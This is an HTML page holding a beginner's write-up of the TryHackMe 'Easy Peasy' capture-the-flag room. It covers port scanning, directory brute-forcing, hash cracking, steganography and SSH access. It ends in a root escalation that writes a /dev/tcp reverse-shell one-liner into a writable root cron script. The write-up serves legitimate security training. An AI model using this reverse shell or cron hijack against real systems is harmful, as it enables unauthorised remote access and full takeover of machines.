@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe Writeup</title>
+  <style>
+    :root {
+      --bg-dark: #0f111a;
+      --bg-light: #1a1c29;
+      --accent: #00ffae;
+      --text-light: #e0e0e0;
+      --text-muted: #a0a3b5;
+      --hover-bg: #23263a;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: var(--bg-dark);
+      color: var(--text-light);
+      display: flex;
+      justify-content: center;
+      padding: 2rem;
+    }
+
+    .container {
+      max-width: 800px;
+      width: 100%;
+      background-color: var(--bg-light);
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 255, 174, 0.1);
+    }
+
+    h1 {
+      color: var(--accent);
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+
+    p {
+      line-height: 1.6;
+      color: var(--text-light);
+    }
+
+    img {
+      max-width: 100%;
+      display: block;
+      margin: 1.5rem auto;
+      border-radius: 6px;
+    }
+
+    .muted {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      margin-top: 2rem;
+      text-align: center;
+    }
+    .qa {
+  margin-top: 2rem;
+}
+
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>TryHackMe | <a href=https://tryhackme.com/room/easypeasyctf>Easy Peasy</a> Write-up</h1>
+
+    <p>Welcome to my write-up for Easy Peasy on TryHackMe! I'm just getting started with CTFs, so this is less of a tutorial and more of a “let's SUFFER together” kind of deal. But you know what they say:<br>NO PAIN, NO GAIN!! 🗣️🔥</p>
+
+    <p><strong>Task 1 : Enumeration through Nmap</strong></p>
+
+    <p>First, let's run a quick Nmap scan on the target IP.</p>
+
+    <img src="writeups/p1.png" alt="pic1">
+    <p>Only one port was open. But when I submitted that as the answer, it marked me wrong. So let's run a more thorough scan this time...</p>
+
+    <img src="writeups/p2.png" alt="pic2">
+    <ul>
+    <li><code>-sS</code> &mdash; TCP SYN scan (stealthy and faster than a full connect scan)</li>
+    <li><code>-p-</code> &mdash; Scan all 65,535 TCP ports</li>
+    <li><code>-T4</code> &mdash; Set timing to level 4 (faster scan, still generally safe)</li>
+    <li><code>-Pn</code> &mdash; Skip host discovery (assume the host is up, useful if ICMP is blocked)</li>
+    </ul>
+    <p><strong>Note:</strong> We use the <code>-Pn</code> flag to skip host discovery because we already know the host is up. This avoids unnecessary ping checks, which might be blocked by the target.</p>
+
+    <p>The full scan took about 20 minutes, but now we can finally see all the open ports.</p>
+
+    <p>The next two questions require a version scan, so let's run nmap again with the '-sV' flag, but this time, only scanning the open ports, which will save us a lot of time.</p>
+    <img src="writeups/p3.png" alt="pic3">
+    <p>And we got all the answers to the task 1 easily.</p>
+    <p><strong>Task 2 : Compromising the machine</strong></p>
+  <p>Let's start with the web server on port 80 : http://target-ip:80.</p>
+  <p>There wasn’t much going on. I checked the page source, tried robots.txt, but nothing interesting showed up.</p>
+  <img src="writeups/p6.png" alt="pic6">
+  <p>Let's follow the task and use gobuster to find the hidden directory on port 80.</p>
+  <p><strong>Notes : </strong>The standard command is 'gobuster dir -u http://ip:port -w /path/to/wordlist'. But since port 80 is the default for HTTP, we can skip the :port part unless we're scanning a non-standard one (like :65524).</p>
+  <p>We found a directory named '/hidden' but upon visting the page, we only see a picture of an abandoned room. There is nothing interesting in the page source either.</p>
+  <p>So we ran gobuster again, this time on the '/hidden' page. This revealed another hidden directory '/whatever' which has something suspecious in the page source: a hidden string that looked like base64.</p>
+  <img src="writeups/p4.png" alt="pic4">
+  <img src="writeups/p5.png" alt="pic5">
+  <p>We can decode it in any online base64 decoder and get the first flag.</p>
+  <img src="writeups/p7.png" alt="pic7">
+  <p>Now let's move onto the server on port 65524>>http://target-ip:65524, which looks like a normal Apache 2 page. I checked the robots.txt and there is a hash.</p>
+  <img src="writeups/p8.png" alt="pic8">
+  <p>I used MD5 Center Website to reverse the hash and there we have the second flag!</p>
+  <img src="writeups/p9.png" alt="pic9">
+  <p>I checked the page source to find any suspecious hints, and there is flag 3 hidden in the paragraphs.</p>
+  <img src="writeups/p10.png" alt="pic10">
+  <p>The question hinted that there is a hidden directory, so I used gobuster to check, but no new directory was found, strange....</p>
+  <img src="writeups/p13.png" alt="pic13">
+  <p>Let's check the page source again to find any hints. And there is an encoded text between the paragraphs, which is also hinted that it was encoded with ba.....</p>
+  <img src="writeups/p11.png" alt="pic11">
+  <p> I tried base64 but it doesn't work. So I find another Online Base X <a href="https://www.toolhelper.cn/en/EncodeDecode/Base"> Encoder/Decoder</a> and tried base62. It reveals a message, which could be a hidden directory based on the question.</p>
+  <img src="writeups/p12.png" alt="pic12">
+  <p>In /n0th1ng3ls3m4tt3r page, I noticed another hidden hash because....my cursor changed.</p>
+  <p>You can see the hash in the page source too.</p>
+  <img src="writeups/p14.png" alt="pic14">
+  <p>I can't decode it with MD5 decoder...But the question hinted that it's a Gost hash, so I decoded it with Gost decoder from <a href="https://md5hashing.net/hash/gost">MD5hashing.net</a>.</p>
+  <p>(I did not notice the "easypeasy.txt" in the room at the time, which would have saved me so much time if used with john the ripper. But anyway, we got the password.)</p>
+  <img src="writeups/p15.png" alt="pic15">
+  <p>Checking the page source again, the small image is named "binarycodebixabay.jpg", hmmm "binarycode" huh? suspecious, it could be a binary encoded message. Let's download and inspect it.</p>
+  <p>Download the image with "wget -http://target-ip:65524//n0th1ng3ls3m4tt3r/binarycodebixabay.jpg".</p>
+  <p>And ran steghide : "steghide extract -sf binarycodebixabay.jpg" to extract any possible hidden codes using the previous discovered passcode.</p>
+  <img src="writeups/p17.png" alt="pic17">
+  <img src="writeups/p18.png" alt="pic18">
+  <p>We get the username 'boring' and a binary encoded password, let's decode the password in an online decoder.</p>
+  <img src="writeups/p16.png" alt="pic16">
+  <p>At the very start, when we scanned the target with nmap, we know that there is a ssh service running on port 6498. Since we now have the username and password, let's login the machine.<br>ssh username@target-ip -p port</p>
+  <img src="writeups/p19.png" alt="pic19">
+  <p>And....we are in! I started with listing out the files and directory with ls command. And there is a single text file so I cat it out.</p>
+  <img src="writeups/p20.png" alt="pic20">
+  <p>It is hinted that the flag is rotated. What we have to do is to rotate it back until it makes sense.</p>
+  <img src="writeups/p21.png" alt="pic21">
+  <p>And for the final question, we need the root flag. I ran sudo -l to check the permissions of user boring, and it shows that user boring doesn't have permission to run sudo.<br> Let's check the crontab. It's a common place to find hidden persistence in ctf challenges.</p>
+  <img src="writeups/p22.png" alt="pic22">
+  <p>We change the directory to /var/www and cat out the "mysecretcrontab.sh", and it is running as root, and is also writeable by user boring. That's a perfect place to set up a reverse shell. I copied a bash reverse shell : ash -i >& /dev/tcp/your-ip/listener-port 0>&1 and echo it into "mysecretcrontab.sh". I used 8585 for the port.</p>
+  <img src="writeups/p23.png" alt="pic23">
+  <p>Quickly open a new terminal and set up the listener with the same port, which soon enough, was connected by the target machine. Now we are root of the target machine.</p>
+  <img src="writeups/p24.png" alt="pic24">
+  <p>Start with ls -la/root to check all the directory and files in /root directory. And now we can cat out the .root.txt from the /root directory (ignore my panic typos lmao).</p>
+  <img src="writeups/p25.png" alt="pic25">
+  <p>And finally after a long suffering, we got all the flags and answers to all the questions!</p>
+    <div class="muted">Zenfozz - May 17, 2025</div>
+  </div>
+
+</body>
+</html>
